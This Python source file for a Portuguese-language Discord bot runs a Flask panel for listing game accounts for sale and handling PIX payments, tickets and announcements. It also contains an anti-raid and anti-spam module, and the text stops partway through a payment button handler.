import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
from config import (
    BOT_TOKEN, TICKET_CHANNEL_ID, TICKET_CATEGORY_ID, LOG_CHANNEL_ID, 
    STAFF_ROLE_IDS, GUILD_ID, BOT_PREFIX, COLORS
)
from ticket_manager import TicketManager
from backup_manager import BackupManager
from loja_builder import LojaBuilder
from pix_manager import PixManager
from api_auth import require_api_token
import logging
import asyncio
import json
from datetime import datetime, timedelta
from collections import deque, defaultdict
import sys
import time
import re

# Keep-alive e painel web integrado
from flask import Flask, jsonify, request, send_from_directory
import threading
import os

# Flask app que serve tanto keep-alive quanto painel
app = Flask(__name__)
bot_instance = None

# Importar e registrar rotas de moderação
from moderation_api import register_moderation_routes

ACCOUNTS_FILE = 'accounts.json'


def _read_accounts_file():
    if not os.path.exists(ACCOUNTS_FILE):
        return []

    try:
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except Exception:
        return []

    if isinstance(data, list):
        if _ensure_account_defaults(data):
            _write_accounts_file(data)
        return data
    return []


def _write_accounts_file(accounts):
    try:
        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
            json.dump(accounts, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


def _ensure_account_defaults(accounts):
    changed = False
    for account in accounts:
        changed |= _normalize_account_entry(account)
    return changed


def _normalize_account_entry(account):
    changed = False

    if 'info' in account and 'additional_info' not in account:
        account['additional_info'] = account['info']
        changed = True
    elif 'additional_info' in account and 'info' not in account:
        account['info'] = account['additional_info']
        changed = True

    available = account.get('available')
    if isinstance(available, str):
        available = available.lower() in ('1', 'true', 'yes', 'sim', 'available', 'disponivel', 'disponível')
        account['available'] = available
        changed = True

    if available is None:
        status = str(account.get('status', '')).lower()
        if status:
            available = status in ('available', 'disponivel', 'disponível')
        else:
            available = True
        account['available'] = available
        changed = True

    desired_status = 'available' if account.get('available') else 'unavailable'
    if account.get('status') != desired_status:
        account['status'] = desired_status
        changed = True

    return changed


def _find_account(accounts, target_id):
    target = str(target_id)
    for account in accounts:
        if str(account.get('id')) == target:
            return account
    return None


def _generate_account_id(accounts):
    numeric_values = []
    for account in accounts:
        match = re.search(r'(\d+)$', str(account.get('id', '')))
        if match:
            numeric_values.append(int(match.group(1)))
    if numeric_values:
        return max(numeric_values) + 1
    return len(accounts) + 1

# Função para obter instância do bot (necessária para as APIs)
    
    # -- Satoru security placeholder --
def get_bot_instance():
    return bot_instance

# Registrar rotas de moderação
register_moderation_routes(app, get_bot_instance)

# ==================== ROTAS DE CONTAS ====================

@app.route('/api/accounts', methods=['GET'])
@require_api_token
def get_accounts():
    """Lista todas as contas"""
    try:
        accounts = _read_accounts_file()
        return jsonify({'success': True, 'accounts': accounts})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/accounts/add', methods=['POST'])
@require_api_token
def add_account():
    """Adiciona uma nova conta"""
    try:
        data = request.get_json()
        title = data.get('title')
        description = data.get('description')
        price = data.get('price')
        image_url = data.get('image_url', '')
        info = data.get('info') or data.get('additional_info', '')
        
        if not title or not description or not price:
            return jsonify({'success': False, 'error': 'Campos obrigatórios faltando'})
        
        accounts = _read_accounts_file()

        new_account = {
            'id': _generate_account_id(accounts),
            'title': title,
            'description': description,
            'price': price,
            'image_url': image_url,
            'info': info,
            'additional_info': info,
            'status': 'available',
            'available': True,
            'created_at': datetime.now().isoformat()
        }

        accounts.append(new_account)

        success, announce_message, metadata = _announce_account(new_account)
        if success and metadata:
            new_account['message_id'] = metadata['message_id']
            new_account['channel_id'] = metadata['channel_id']
        else:
            new_account['available'] = False
            new_account['status'] = 'unavailable'

        _write_accounts_file(accounts)
        response_payload = {'success': success, 'message': announce_message, 'account': new_account}
        return jsonify(response_payload)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/accounts/<account_id>', methods=['DELETE'])
@require_api_token
def delete_account(account_id):
    """Deleta uma conta"""
    try:
        accounts = _read_accounts_file()
        if not accounts:
            return jsonify({'success': False, 'error': 'Nenhuma conta encontrada'})

        filtered = [a for a in accounts if str(a.get('id')) != str(account_id)]
        if len(filtered) == len(accounts):
            return jsonify({'success': False, 'error': 'Conta não encontrada'}), 404

        _write_accounts_file(filtered)
        return jsonify({'success': True, 'message': 'Conta deletada'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


def _announce_account(account_data):
    if not bot_instance:
        return False, "Bot não está conectado", None

    async def _post():
        try:
            from config import load_channel_ids
            config = load_channel_ids()
            accounts_channel_id = config.get('accounts_channel_id', 0)

            if accounts_channel_id == 0:
                return False, "Canal de contas não configurado", None

            channel = bot_instance.get_channel(accounts_channel_id)
            if not channel:
                return False, "Canal de contas não encontrado", None

            embed = discord.Embed(
                title=f"🎮 {account_data['title']}",
                description=account_data['description'],
                color=0x00ff00,
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="💰 Preço", value=account_data['price'], inline=True)
            embed.add_field(name="📊 Status", value="✅ Disponível", inline=True)
            info_value = account_data.get('info') or account_data.get('additional_info')
            if info_value:
                embed.add_field(name="ℹ️ Informações", value=info_value, inline=False)
            if account_data.get('image_url'):
                embed.set_thumbnail(url=account_data['image_url'])
            embed.set_footer(text=f"ID: {account_data['id']}")

            view = BuyAccountView(str(account_data['id']), account_data)
            message = await channel.send(embed=embed, view=view)
            metadata = {'message_id': message.id, 'channel_id': channel.id}
            return True, "Conta anunciada com sucesso!", metadata
        except Exception as exc:
            return False, str(exc), None

    try:
        loop = bot_instance.loop
        future = asyncio.run_coroutine_threadsafe(_post(), loop)
        return future.result(timeout=10)
    except Exception as exc:
        return False, str(exc), None


def _delete_account_message(account_data):
    if not bot_instance:
        return False, "Bot não está conectado"

    message_id = account_data.get('message_id')
    channel_id = account_data.get('channel_id')
    if not message_id or not channel_id:
        return False, "Nenhum anúncio associado a esta conta"

    async def _delete():
        try:
            channel = bot_instance.get_channel(int(channel_id))
            if not channel:
                return False, "Canal do anúncio não encontrado"

            try:
                message = await channel.fetch_message(int(message_id))
            except discord.NotFound:
                return True, "Mensagem já removida anteriormente"

            await message.delete()
            return True, "Anúncio removido do canal"
        except Exception as exc:
            return False, str(exc)

    try:
        loop = bot_instance.loop
        future = asyncio.run_coroutine_threadsafe(_delete(), loop)
        return future.result(timeout=10)
    except Exception as exc:
        return False, str(exc)


@app.route('/api/account/<account_id>/toggle', methods=['POST'])
@require_api_token
def toggle_account(account_id):
    """Alterna disponibilidade e anuncia quando virar disponível"""
    try:
        accounts = _read_accounts_file()
        account = _find_account(accounts, account_id)
        if not account:
            return jsonify({'success': False, 'error': 'Conta não encontrada'}), 404

        previous_state = bool(account.get('available', True))
        account['available'] = not previous_state
        account['status'] = 'available' if account['available'] else 'unavailable'

        success_flag = True
        message = 'Conta marcada como indisponível'

        if account['available'] and not previous_state:
            success, announce_msg, metadata = _announce_account(account)
            if success and metadata:
                account['message_id'] = metadata['message_id']
                account['channel_id'] = metadata['channel_id']
                message = announce_msg
            else:
                account['available'] = False
                account['status'] = 'unavailable'
                success_flag = False
                message = f"Erro ao anunciar: {announce_msg}"
        elif not account['available'] and previous_state:
            success, removal_msg = _delete_account_message(account)
            if success:
                account.pop('message_id', None)
                account.pop('channel_id', None)
                message = removal_msg
            else:
                success_flag = False
                message = f"Conta indisponível, mas não foi possível remover o anúncio: {removal_msg}"

        _write_accounts_file(accounts)
        return jsonify({'success': success_flag, 'available': account['available'], 'message': message})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ==================== ROTAS DE PIX ====================

@app.route('/api/pix/config', methods=['GET'])
@require_api_token
def get_pix_config():
    """Obtém configuração do PIX"""
    try:
        config = pix_manager.config.copy()
        pix_key = config.pop('pix_key', None)

        if pix_key:
            if len(pix_key) > 8:
                config['pix_key_masked'] = pix_key[:4] + '****' + pix_key[-4:]
            else:
                config['pix_key_masked'] = '****'
        else:
            config['pix_key_masked'] = None

        return jsonify({'success': True, 'config': config})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/pix/config', methods=['POST'])
@require_api_token
def update_pix_config():
    """Atualiza configuração do PIX"""
    try:
        data = request.get_json()
        pix_key = data.get('pix_key')
        pix_name = data.get('pix_name')
        pix_city = data.get('pix_city', 'SAO PAULO')
        
        if not pix_key or not pix_name:
            return jsonify({'success': False, 'error': 'Chave PIX e nome são obrigatórios'})
        
        pix_manager.update_config(pix_key, pix_name, pix_city)
        return jsonify({'success': True, 'message': 'Configuração PIX atualizada com sucesso'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/pix/payments', methods=['GET'])
@require_api_token
def get_all_payments():
    """Lista todos os pagamentos"""
    try:
        payments = pix_manager.get_all_payments()
        return jsonify({'success': True, 'payments': payments})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/pix/payments/pending', methods=['GET'])
@require_api_token
def get_pending_payments():
    """Lista pagamentos pendentes"""
    try:
        payments = pix_manager.get_pending_payments()
        return jsonify({'success': True, 'payments': payments})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/pix/payment/<payment_id>/confirm', methods=['POST'])
@require_api_token
def confirm_payment(payment_id):
    """Confirma um pagamento"""
    try:
        data = request.get_json()
        staff_id = data.get('staff_id', 'admin')
        
        success, message = pix_manager.confirm_payment(payment_id, staff_id)
        
        if success:
            return jsonify({'success': True, 'message': message})
        else:
            return jsonify({'success': False, 'error': message}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/pix/payment/<payment_id>/cancel', methods=['POST'])
@require_api_token
def cancel_payment(payment_id):
    """Cancela um pagamento"""
    try:
        success, message = pix_manager.cancel_payment(payment_id)
        
        if success:
            return jsonify({'success': True, 'message': message})
        else:
            return jsonify({'success': False, 'error': message}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Rota principal - serve o painel web
@app.route('/')
def home():
    try:
        return send_from_directory(os.getcwd(), 'index.html')
    except Exception as e:
        return f"Erro ao carregar painel: {str(e)}", 500

@app.route('/health')
def health():
    return "OK"

# API para enviar anúncios
@app.route('/api/announcement/send', methods=['POST'])
@require_api_token
def send_announcement():
    """Envia um anúncio no canal configurado"""
    try:
        if not bot_instance:
            return jsonify({'success': False, 'error': 'Bot não está conectado'}), 503
        
        data = request.get_json()
        message = data.get('message')
        
        if not message:
            return jsonify({'success': False, 'error': 'Mensagem é obrigatória'}), 400
        
        async def post_announcement():
            try:
                # Recarregar configuração em tempo real
                import json
                channel_id = 0
                
                if os.path.exists('channel_config.json'):
                    with open('channel_config.json', 'r', encoding='utf-8') as f:
                        config = json.load(f)
                        channel_id = config.get('announcements_channel_id', 0)
                
                # Se não encontrou no JSON, buscar por nome
                if channel_id == 0:
                    for guild in bot_instance.guilds:
                        for ch in guild.text_channels:
                            if 'anúncio' in ch.name.lower() or 'anuncio' in ch.name.lower():
                                channel_id = ch.id
                                break
                        if channel_id != 0:
                            break
                
                if channel_id == 0:
                    return False, "Canal de anúncios não encontrado. Use !nova_loja para criar estrutura automaticamente."
                
                channel = bot_instance.get_channel(channel_id)
                if not channel:
                    return False, "Canal de anúncios não encontrado"
                
                embed = discord.Embed(
                    title="📢 Anúncio Importante",
                    description=message,
                    color=0x3498db,
                    timestamp=discord.utils.utcnow()
                )
                embed.set_footer(text="Equipe iBot")
                
                await channel.send(embed=embed)
                return True, "Anúncio enviado com sucesso!"
            except Exception as e:
                return False, str(e)
        
        try:
            loop = bot_instance.loop
            future = asyncio.run_coroutine_threadsafe(post_announcement(), loop)
            success, result = future.result(timeout=10)
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)}), 500
        
        if success:
            return jsonify({'success': True, 'message': result}), 200
        else:
            return jsonify({'success': False, 'error': result}), 400
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

LOG_BUFFER_LIMIT = 500
log_buffer = deque(maxlen=LOG_BUFFER_LIMIT)

class PanelLogHandler(logging.Handler):
    """Armazena logs em memória para o painel"""

    def __init__(self):
        super().__init__()
        self.setFormatter(logging.Formatter('%(asctime)s %(levelname)s - %(message)s', '%Y-%m-%d %H:%M:%S'))

    def emit(self, record: logging.LogRecord):
        try:
            log_buffer.append({
                "level": record.levelname,
                "message": self.format(record)
            })
        except Exception:
            pass

panel_log_handler = PanelLogHandler()
logging.getLogger().addHandler(panel_log_handler)

# Intents necessários
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

# Criando o bot
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
ticket_manager = TicketManager(bot)
backup_manager = BackupManager()
loja_builder = LojaBuilder(bot)
pix_manager = PixManager()

# ==================== SATORU SECURITY ====================

class SatoruSecurity:
    """Camada de proteção inteligente contra raids e spam."""

    JOIN_WINDOW_SECONDS = 25
    JOIN_THRESHOLD = 6
    MESSAGE_WINDOW_SECONDS = 4
    MESSAGE_THRESHOLD = 7
    TIMEOUT_MINUTES = 15
    LOCKDOWN_DURATION_MINUTES = 8
    NEW_ACCOUNT_MAX_DAYS = 7
    MENTION_THRESHOLD = 6
    LINK_THRESHOLD = 3
    LINK_WINDOW_SECONDS = 6
    SUSPECT_ESCALATION_THRESHOLD = 3
    GLOBAL_SLOWMODE_SECONDS = 8
    MAX_COOLDOWN_CHANNELS = 6
    LINK_REGEX = re.compile(r'https?://\S+', re.IGNORECASE)

    def __init__(self, bot_instance: commands.Bot):
        self.bot = bot_instance
        self.active = False
        self.lockdown_active = False
        self.lockdown_until = None
        self.join_events = deque()
        self.message_events = defaultdict(deque)
        self.link_events = defaultdict(deque)
        self.suspect_scores = defaultdict(int)
        self.cooldown_channels = set()

    async def activate(self, ctx):
        if self.active:
            await ctx.send(embed=self._build_status_embed(ctx.guild, "🟢 Satoru já está ativo."))
            return

        self.active = True
        self.join_events.clear()
        self.message_events.clear()
        self.lockdown_active = False
        self.lockdown_until = None

        await ctx.send(embed=self._build_status_embed(ctx.guild, "🛡️ Proteção Satoru ativada com sucesso!"))
        await self._log_event(
            ctx.guild,
            "🛡️ Satoru ativado",
            f"Ativado por {ctx.author.mention}. O servidor será monitorado contra raids.",
            COLORS["info"]
        )

    async def deactivate(self, ctx):
        if not self.active:
            await ctx.send(embed=self._build_status_embed(ctx.guild, "Satoru já está desativado."))
            return

        self.active = False
        self.lockdown_active = False
        self.lockdown_until = None
        self.join_events.clear()
        self.message_events.clear()

        await ctx.send(embed=self._build_status_embed(ctx.guild, "🔕 Proteção Satoru desativada."))
        await self._log_event(
            ctx.guild,
            "🔕 Satoru desativado",
            f"Desativado por {ctx.author.mention}. Monitoramento extra pausado.",
            COLORS["warning"]
        )

    def _trim_history(self, history: deque, window_seconds: int):
        now = datetime.utcnow()
        while history and (now - history[0]).total_seconds() > window_seconds:
            history.popleft()

    def _is_account_new(self, member: discord.Member) -> bool:
        if not member.created_at:
            return False
        account_age = discord.utils.utcnow() - member.created_at
        return account_age < timedelta(days=self.NEW_ACCOUNT_MAX_DAYS)

    async def _flag_suspect(self, member: discord.Member, reason: str, immediate: bool = False):
        if not member or not member.guild:
            return

        self.suspect_scores[member.id] += 1
        score = self.suspect_scores[member.id]

        await self._log_event(
            member.guild,
            "👁️ Usuário monitorado",
            f"{member.mention} marcado como suspeito ({score}/{self.SUSPECT_ESCALATION_THRESHOLD}). Motivo: {reason}.",
            COLORS["warning"]
        )

        if immediate or score >= self.SUSPECT_ESCALATION_THRESHOLD:
            self.suspect_scores[member.id] = 0
            await self._apply_emergency_action(member, f"Suspeito reincidente: {reason}")

    def _record_link_events(self, author_id: int, link_count: int) -> int:
        history = self.link_events[author_id]
        now = datetime.utcnow()
        for _ in range(max(link_count, 1)):
            history.append(now)
        self._trim_history(history, self.LINK_WINDOW_SECONDS)
        return len(history)

    async def _apply_global_cooldown(self, guild: discord.Guild):
        if not guild:
            return

        self.cooldown_channels.clear()
        for channel in guild.text_channels:
            if len(self.cooldown_channels) >= self.MAX_COOLDOWN_CHANNELS:
                break

            perms = channel.permissions_for(guild.default_role)
            if not perms.send_messages or channel.slowmode_delay >= self.GLOBAL_SLOWMODE_SECONDS:
                continue

            try:
                await channel.edit(
                    slowmode_delay=self.GLOBAL_SLOWMODE_SECONDS,
                    reason="Satoru: Lockdown preventivo"
                )
                self.cooldown_channels.add(channel.id)
            except (discord.Forbidden, discord.HTTPException):
                continue

        if self.cooldown_channels:
            await self._log_event(
                guild,
                "⛔ Cooldown global aplicado",
                f"{len(self.cooldown_channels)} canais públicos receberam slowmode de {self.GLOBAL_SLOWMODE_SECONDS}s.",
                COLORS["warning"]
            )

    async def _restore_channel_slowmodes(self, guild: discord.Guild):
        if not self.cooldown_channels or not guild:
            return

        restored = 0
        for channel_id in list(self.cooldown_channels):
            channel = guild.get_channel(channel_id)
            if not channel:
                continue

            try:
                await channel.edit(slowmode_delay=0, reason="Satoru: Lockdown encerrado")
                restored += 1
            except (discord.Forbidden, discord.HTTPException):
                continue

        self.cooldown_channels.clear()

        if restored:
            await self._log_event(
                guild,
                "✅ Cooldown revertido",
                f"Slowmode removido de {restored} canais após o fim do lockdown.",
                COLORS["success"]
            )

    async def _on_lockdown_finished(self, guild: discord.Guild):
        await self._restore_channel_slowmodes(guild)
        await self._log_event(
            guild,
            "✅ Lockdown encerrado",
            "O bloqueio automático foi encerrado por tempo expirado.",
            COLORS["success"]
        )

    async def handle_member_join(self, member: discord.Member) -> bool:
        if not self.active or member.bot or member.guild is None:
            return False

        self._refresh_lockdown(member.guild)

        if self.lockdown_active:
            await self._apply_emergency_action(member, "Servidor em lockdown")
            return True

        now = datetime.utcnow()
        self.join_events.append(now)
        self._trim_history(self.join_events, self.JOIN_WINDOW_SECONDS)

        if len(self.join_events) >= self.JOIN_THRESHOLD:
            await self._trigger_lockdown(member.guild, "Entrada massiva detectada")
            await self._apply_emergency_action(member, "Raid detectada (entradas em massa)")
            return True

        if self._is_account_new(member):
            account_age = discord.utils.utcnow() - member.created_at
            reason = f"Conta criada há {account_age.days} dia(s)"
            await self._flag_suspect(member, reason, immediate=self.lockdown_active)
            if self.lockdown_active:
                return True

        return False

    async def handle_message(self, message: discord.Message):
        if (
            not self.active
            or message.guild is None
            or message.author.bot
            or not isinstance(message.author, discord.Member)
        ):
            return

        if message.author.guild_permissions.manage_messages:
            return

        now = datetime.utcnow()
        history = self.message_events[message.author.id]
        history.append(now)
        self._trim_history(history, self.MESSAGE_WINDOW_SECONDS)

        if len(history) >= self.MESSAGE_THRESHOLD:
            try:
                await message.delete()
            except Exception:
                pass

            await self._apply_emergency_action(message.author, "Envio massivo de mensagens")
            self.message_events.pop(message.author.id, None)
            self.link_events.pop(message.author.id, None)
            return

        mention_count = len(message.mentions)
        if message.mention_everyone:
            mention_count += self.MENTION_THRESHOLD

        if mention_count >= self.MENTION_THRESHOLD:
            try:
                await message.delete()
            except Exception:
                pass
            await self._flag_suspect(message.author, "Menções em massa", immediate=True)
            self.message_events.pop(message.author.id, None)


        links_found = self.LINK_REGEX.findall(message.content or "")
        if links_found:
            burst = self._record_link_events(message.author.id, len(links_found))
            if burst >= self.LINK_THRESHOLD:
                try:
                    await message.delete()
                except Exception:
                    pass
                await self._flag_suspect(message.author, "Spam de links suspeitos")
                self.link_events.pop(message.author.id, None)
                self.message_events.pop(message.author.id, None)
                return
    def _refresh_lockdown(self, guild: discord.Guild):
        if not self.lockdown_active:
            return

        if self.lockdown_until and datetime.utcnow() > self.lockdown_until:
            self.lockdown_active = False
            self.lockdown_until = None
            asyncio.create_task(self._on_lockdown_finished(guild))

    async def _apply_emergency_action(self, member: discord.Member, reason: str):
        action = None
        try:
            until = discord.utils.utcnow() + timedelta(minutes=self.TIMEOUT_MINUTES)
            await member.timeout(until, reason=f"Satoru: {reason}")
            action = f"timeout de {self.TIMEOUT_MINUTES} minutos"
        except (discord.Forbidden, discord.HTTPException):
            try:
                await member.kick(reason=f"Satoru: {reason}")
                action = "kick automático"
            except (discord.Forbidden, discord.HTTPException):
                action = None

        if action:
            await self._log_event(
                member.guild,
                "⚠️ Satoru aplicou sanção",
                f"{member.mention} recebeu {action}. Motivo: {reason}.",
                COLORS["warning"]
            )

    async def _trigger_lockdown(self, guild: discord.Guild, reason: str):
        if self.lockdown_active:
            return

        self.lockdown_active = True
        self.lockdown_until = datetime.utcnow() + timedelta(minutes=self.LOCKDOWN_DURATION_MINUTES)
        await self._log_event(
            guild,
            "🚨 Lockdown Satoru",
            f"{reason}. Novos membros serão temporariamente silenciados pelos próximos {self.LOCKDOWN_DURATION_MINUTES} minutos.",
            COLORS["error"]
        )
        await self._apply_global_cooldown(guild)

    async def _log_event(self, guild: discord.Guild, title: str, description: str, color: int):
        if not guild:
            return

        log_channel = guild.get_channel(LOG_CHANNEL_ID)
        if not log_channel:
            return

        embed = discord.Embed(
            title=title,
            description=description,
            color=color,
            timestamp=discord.utils.utcnow()
        )
        try:
            await log_channel.send(embed=embed)
        except Exception:
            pass

    def _build_status_embed(self, guild: discord.Guild, message: str) -> discord.Embed:
        embed = discord.Embed(
            title="🛡️ Proteção Satoru",
            description=message,
            color=COLORS["info"] if self.active else COLORS["warning"],
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name="Estado", value="Ativo" if self.active else "Desativado", inline=True)
        embed.add_field(name="Lockdown", value="Ativo" if self.lockdown_active else "Desligado", inline=True)
        if self.lockdown_active and self.lockdown_until:
            embed.add_field(
                name="Termina em",
                value=f"<t:{int(self.lockdown_until.timestamp())}:R>",
                inline=False
            )
        if self.cooldown_channels:
            embed.add_field(
                name="Canais em slowmode",
                value=str(len(self.cooldown_channels)),
                inline=True
            )
        if self.suspect_scores:
            embed.add_field(
                name="Suspeitos monitorados",
                value=str(len(self.suspect_scores)),
                inline=True
            )
        embed.set_footer(text="Satoru mantém o servidor protegido contra raids")
        return embed

    def status_embed(self, guild: discord.Guild, message: str = "Status atual da proteção") -> discord.Embed:
        return self._build_status_embed(guild, message)


satoru_security = SatoruSecurity(bot)

# ==================== AUTO-DETECÇÃO DE CANAIS ====================

async def auto_detect_channels():
    """Auto-detecta canais importantes se não estiverem configurados"""
    import json
    from config import GUILD_ID
    
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        logger.warning("⚠️ Servidor não encontrado para auto-detecção")
        return
    
    # Verificar se já existe configuração válida
    try:
        if os.path.exists('channel_config.json'):
            with open('channel_config.json', 'r', encoding='utf-8') as f:
                config = json.load(f)
                if config.get('ticket_channel_id', 0) > 0:
                    logger.info("✅ Canais já configurados via channel_config.json")
                    return
    except Exception as e:
        logger.warning(f"⚠️ Erro ao verificar channel_config.json: {e}")
    
    # Auto-detectar por nome
    logger.info("🔍 Auto-detectando canais por nome...")
    
    config = {
        "ticket_channel_id": 0,
        "ticket_category_id": 0,
        "log_channel_id": 0,
        "announcements_channel_id": 0,
        "accounts_channel_id": 0,
        "welcome_channel_id": 0
    }
    
    # Buscar canais
    for channel in guild.text_channels:
        name = channel.name.lower()
        if 'ticket' in name and config['ticket_channel_id'] == 0:
            config['ticket_channel_id'] = channel.id
            logger.info(f"✅ Canal de tickets detectado: #{channel.name} ({channel.id})")
        elif 'anúncio' in name or 'anuncio' in name and config['announcements_channel_id'] == 0:
            config['announcements_channel_id'] = channel.id
            logger.info(f"✅ Canal de anúncios detectado: #{channel.name} ({channel.id})")
        elif 'conta' in name and 'roblox' in name and config['accounts_channel_id'] == 0:
            config['accounts_channel_id'] = channel.id
            logger.info(f"✅ Canal de contas detectado: #{channel.name} ({channel.id})")
        elif 'log' in name and config['log_channel_id'] == 0:
            config['log_channel_id'] = channel.id
            logger.info(f"✅ Canal de logs detectado: #{channel.name} ({channel.id})")
        elif ('boas-vinda' in name or 'bem-vindo' in name or 'welcome' in name) and config['welcome_channel_id'] == 0:
            config['welcome_channel_id'] = channel.id
            logger.info(f"✅ Canal de boas-vindas detectado: #{channel.name} ({channel.id})")
    
    # Buscar categoria de atendimento
    for category in guild.categories:
        if 'atendimento' in category.name.lower() and config['ticket_category_id'] == 0:
            config['ticket_category_id'] = category.id
            logger.info(f"✅ Categoria de tickets detectada: {category.name} ({category.id})")
            break
    
    # Salvar configuração detectada
    if any(v > 0 for v in config.values()):
        try:
            with open('channel_config.json', 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=2, ensure_ascii=False)
            logger.info("✅ Configuração de canais salva automaticamente")
            
            # Recarregar config
            from config import load_channel_ids
            global TICKET_CHANNEL_ID, TICKET_CATEGORY_ID, LOG_CHANNEL_ID, ANNOUNCEMENTS_CHANNEL_ID, ACCOUNTS_CHANNEL_ID, WELCOME_CHANNEL_ID
            _config = load_channel_ids()
            TICKET_CHANNEL_ID = _config.get('ticket_channel_id', 0)
            TICKET_CATEGORY_ID = _config.get('ticket_category_id', 0)
            LOG_CHANNEL_ID = _config.get('log_channel_id', 0)
            ANNOUNCEMENTS_CHANNEL_ID = _config.get('announcements_channel_id', 0)
            ACCOUNTS_CHANNEL_ID = _config.get('accounts_channel_id', 0)
            WELCOME_CHANNEL_ID = _config.get('welcome_channel_id', 0)
            
        except Exception as e:
            logger.error(f"❌ Erro ao salvar configuração detectada: {e}")
    else:
        logger.warning("⚠️ Nenhum canal foi detectado automaticamente")

# ==================== MODAL PARA MOTIVO ====================

class CloseTicketModal(discord.ui.Modal, title="Fechar Ticket"):
    """Modal para solicitar o motivo do fechamento"""
    
    reason = discord.ui.TextInput(
        label="Motivo do Fechamento",
        style=discord.TextStyle.paragraph,
        placeholder="Digite o motivo para fechar este ticket...",
        required=True,
        max_length=500
    )
    
    def __init__(self, view_instance):
        super().__init__()
        self.view_instance = view_instance
    
    async def on_submit(self, interaction: discord.Interaction):
        """Quando o modal é enviado"""
        try:
            await self.view_instance.process_close(interaction, self.reason.value)
        except Exception as exc:
            logger.error(f"❌ Erro ao fechar ticket via modal: {exc}", exc_info=True)
            if interaction.response.is_done():
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="❌ Erro ao fechar",
                        description="Não foi possível fechar o ticket. Tente novamente ou verifique os logs.",
                        color=COLORS["error"]
                    ),
                    ephemeral=True
                )

# ==================== VIEWS (Botões) ====================

class ConfirmPaymentModal(discord.ui.Modal, title="Confirmar Pagamento"):
    """Modal para confirmar pagamento PIX"""
    
    payment_id_input = discord.ui.TextInput(
        label="ID do Pagamento",
        placeholder="Insira o ID do pagamento",
        required=True,
        max_length=50
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        """Quando o modal é enviado"""
        try:
            payment_id = self.payment_id_input.value
            staff_id = str(interaction.user.id)
            
            success, message = pix_manager.confirm_payment(payment_id, staff_id)
            
            if success:
                # Tenta enviar DM para o usuário
                payment = pix_manager.get_payment(payment_id)
                if payment:
                    try:
                        user = await bot.fetch_user(int(payment['user_id']))
                        dm_embed = discord.Embed(
                            title="✅ Pagamento Confirmado!",
                            description=f"Seu pagamento de **R$ {payment['amount']:.2f}** foi confirmado!\n\n📦 **Conta:** {payment['account_title']}\n\nNossa equipe entrará em contato para finalizar a entrega.",
                            color=COLORS["success"]
                        )
                        await user.send(embed=dm_embed)
                    except:
                        pass
                
                logger.info(f"Pagamento {payment_id} confirmado por {interaction.user} ({interaction.user.id})")
                
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="✅ Sucesso",
                        description=message,
                        color=COLORS["success"]
                    ),
                    ephemeral=True
                )
            else:
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="❌ Erro",
                        description=message,
                        color=COLORS["error"]
                    ),
                    ephemeral=True
                )
        except Exception as e:
            logger.error(f"Erro ao confirmar pagamento: {e}")
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description=f"Erro ao confirmar pagamento: {str(e)}",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )

class PixPaymentView(discord.ui.View):
    """View para pagamento PIX com botões para cliente e staff"""
    
    def __init__(self, payment_id: str, pix_key: str, amount: float):
        super().__init__(timeout=None)
        self.payment_id = payment_id
        self.pix_key = pix_key
        self.amount = amount
    
    @discord.ui.button(label="✅ Já Paguei", style=discord.ButtonStyle.green, emoji="💳", row=0)
    async def payment_done(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para cliente notificar staff que pagou"""
        guild = bot.get_guild(GUILD_ID)
        staff_roles = [guild.get_role(role_id) for role_id in STAFF_ROLE_IDS if guild and guild.get_role(role_id)]
        staff_mentions = " ".join([role.mention for role in staff_roles])
        
        embed = discord.Embed(
            title="💰 Pagamento Realizado - Aguardando Confirmação",
            description=f"{interaction.user.mention} informou que realizou o pagamento!",
            color=COLORS["warning"],
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name="💳 ID do Pagamento", value=f"`{self.payment_id}`", inline=False)
        embed.add_field(name="💰 Valor", value=f"R$ {self.amount:.2f}", inline=True)
        embed.add_field(name="⏰ Status", value="⏳ Aguardando confirmação da equipe", inline=False)
        
        await interaction.response.send_message(
            content=f"🔔 {staff_mentions}",
            embed=embed
        )
        
        await interaction.followup.send(
            embed=discord.Embed(
                title="✅ Notificação Enviada",
                description="A equipe foi notificada e verificará seu pagamento em breve!",
                color=COLORS["success"]
            ),
            ephemeral=True
        )
    
    @discord.ui.button(label="✅ Confirmar Pagamento", style=discord.ButtonStyle.blurple, emoji="🔐", row=0)
    async def confirm_payment_staff(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Botão para STAFF confirmar pagamento - Abre modal"""
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Servidor não encontrado!",
                    color=COLORS["error"]
                ),
                ephemeral=True
            )
            return
        
